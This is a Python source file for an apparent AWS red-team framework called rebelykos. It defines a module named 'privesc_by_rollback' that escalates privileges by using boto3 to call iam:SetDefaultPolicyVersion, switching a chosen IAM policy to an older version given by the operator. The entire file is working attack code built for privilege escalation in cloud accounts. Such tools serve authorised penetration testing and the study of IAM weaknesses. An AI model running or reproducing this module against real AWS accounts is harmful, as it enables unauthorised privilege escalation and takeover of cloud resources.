import boto3

from rebelykos.core.response import Response as res
from rebelykos.core.teamserver.module import Module


class RLModule(Module):
    def __init__(self):
        super().__init__()
        self.name = "privesc_by_rollback"
        self.description = ("Elevate privileges by using "
                            "iam:SetDefaultPolicyVersion")
        self.author = "Takahiro Yokoyama"
        self.options["VersionId"] = {
            "Description": ("The version of the policy to set as"
                            " the default (operative) version."),
            "Required": True,
            "Value": ""
        }
        self.options["PolicyArn"] = {
            "Description": "PolicyArn to change the default version.",
            "Required": True,
            "Value": ""
        }

    def run(self):
        result = []
        client = boto3.client("iam", **self["profile"])
        result.extend(self._handle_err(client.set_default_policy_version,
                                       VersionId=self["VersionId"],
                                       PolicyArn=self["PolicyArn"]))
        if result[-1][0] == res.RESULT:
            result.pop()
            result.append((res.GOOD,
                           "Successfully change default policy version"))
        return result
